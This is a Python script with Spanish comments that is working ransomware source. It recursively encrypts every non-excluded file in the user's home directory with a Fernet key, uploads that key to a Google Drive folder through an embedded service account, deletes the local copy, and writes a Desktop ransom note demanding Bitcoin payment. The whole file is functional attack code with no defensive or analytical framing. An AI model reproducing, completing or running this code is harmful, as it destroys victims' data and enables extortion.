import os
import json
import hashlib
from cryptography.fernet import Fernet
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
from google.oauth2 import service_account

# --- Configuración de encriptación y Drive ---
EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']  # Evita archivos binarios críticos
ARCHIVOS_EXCLUIDOS = ['key.key', 'hashes.json']  # Evita encriptar archivos esenciales del proceso
SCOPES = ['https://www.googleapis.com/auth/drive']  # Permisos requeridos para Google Drive
EMAIL_DESTINO = 'cuenta_desechable@gmail.com'  # Correo que recibirá el archivo subido
PARENT_FOLDER_ID = "1CJi8m_p2fjjA1HcyR8ThUZq7aJ_uCg8b"  # ID de la carpeta de destino en Google Drive

# --- Credenciales de cuenta de servicio incrustadas directamente (en vez de path a JSON)
SERVICE_ACCOUNT_FILE = {
    # CREDS de API GOOGLE DRIVE
}

# --- Genera una clave Fernet y la guarda como archivo ---
def generar_key(path="key.key"):
    key = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(key)
    return key

# --- Calcula el hash SHA-256 del contenido de un archivo ---
def calcular_hash(data):
    return hashlib.sha256(data).hexdigest()

# --- Verifica si una ruta contiene directorios ocultos ---
def es_oculto(path):
    return any(p.startswith('.') for p in path.split(os.sep))

# --- Busca archivos en el sistema evitando extensiones prohibidas y archivos excluidos ---
def encontrar_archivos(ruta_home, key_path, script_path):
    archivos = []
    for dirpath, _, filenames in os.walk(ruta_home):
        if es_oculto(dirpath):
            continue
        for nombre in filenames:
            full_path = os.path.join(dirpath, nombre)
            _, ext = os.path.splitext(nombre)
            if (
                ext.lower() in EXTENSIONES_PROHIBIDAS or
                full_path == key_path or
                full_path == script_path or
                nombre in ARCHIVOS_EXCLUIDOS
            ):
                continue
            archivos.append(full_path)
    return archivos

# --- Encripta los archivos usando la clave proporcionada y guarda hashes ---
def encriptar_archivos(archivos, key):
    f = Fernet(key)
    hashes = {}
    for archivo in archivos:
        try:
            with open(archivo, "rb") as file:
                datos = file.read()
            hash_original = calcular_hash(datos)
            datos_encriptados = f.encrypt(datos)
            with open(archivo, "wb") as file:
                file.write(datos_encriptados)
            hashes[archivo] = hash_original
            print(f"✔ Encriptado: {archivo}")
        except Exception as e:
            print(f"✘ Error con {archivo}: {e}")
    return hashes

# --- Sube un archivo a Google Drive y lo guarda en una carpeta específica ---
def subir_archivo(nombre_local):
    creds = service_account.Credentials.from_service_account_info(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
    service = build('drive', 'v3', credentials=creds)

    file_metadata = {
        'name': 'key.key',
        'parents': [PARENT_FOLDER_ID]  # Especifica la carpeta destino
    }

    media = MediaFileUpload(nombre_local, resumable=True)
    archivo = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")

# --- Ejecución principal del script ---
if __name__ == "__main__":
    ruta_home = os.path.expanduser("~")  # Ruta principal del usuario
    key_path = os.path.realpath("key.key")  # Ruta del archivo de clave
    script_path = os.path.realpath(__file__)  # Ruta del script actual

    # Si no existe la clave, crearla. Si existe, cargarla
    if not os.path.exists("key.key"):
        key = generar_key()
    else:
        with open("key.key", "rb") as f:
            key = f.read()

    # Buscar archivos válidos y encriptarlos
    archivos = encontrar_archivos(ruta_home, key_path, script_path)
    hashes = encriptar_archivos(archivos, key)

    # Guardar los hashes originales por seguridad/verificación
    with open("hashes.json", "w") as f:
        json.dump(hashes, f)

    # Subir la clave a Google Drive y luego eliminarla localmente
    subir_archivo("key.key")
    os.remove("key.key")

    # Crear mensaje en el escritorio
    escritorio = os.path.join(ruta_home, "Desktop")
    with open(os.path.join(escritorio, "INSTRUCCIONES.txt"), "w") as f:
        f.write("Sus archivos fueron encriptados y solo pueden ser recuperados con una clave secreta y un programa que puede obtener depositando 1 dolar en mi cartera de Bitcoin: frf-19.353.201--2***HAWm473-wrw. Saludos.")

    print("\n[🔒] Encriptación completada y clave secreta eliminada de sistema local. LEER INSTRUCCIONES EN ESCRITORIO PARA RECUPERAR DATOS")
